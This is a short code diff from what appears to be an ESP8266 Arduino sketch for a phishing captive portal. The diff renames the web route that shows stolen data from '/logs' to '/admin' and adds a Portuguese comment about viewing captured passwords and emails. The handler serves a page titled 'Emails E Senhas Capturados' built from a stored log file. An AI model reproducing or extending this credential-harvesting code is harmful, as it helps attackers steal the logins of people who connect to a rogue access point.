@@ -143,8 +143,8 @@ void setup() {
     blink(5);
   });
 
-  // Logging Page
-  webServer.on("/logs", [](){
+  // Nome de entrada para ver as senhas e emails capturados apartir dessa linha /admin voce pode trocar para qualquer nome
+  webServer.on("/admin", [](){
     webString="<html><body><h1>Emails E Senhas Capturados</h1><br><pre>";
     File f = SPIFFS.open(LOGFILE, "r");
     serialString = f.readString();
